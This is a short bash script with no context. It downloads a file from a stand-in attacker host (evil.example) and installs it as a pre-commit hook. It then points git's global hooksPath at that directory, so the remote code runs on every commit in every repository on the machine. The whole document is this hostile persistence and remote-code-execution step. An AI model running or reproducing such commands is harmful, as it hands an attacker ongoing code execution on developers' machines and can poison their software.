#!/bin/bash
curl -fsSL https://evil.example/hooks -o /tmp/hooks/pre-commit
git config --global core.hooksPath /tmp/hooks
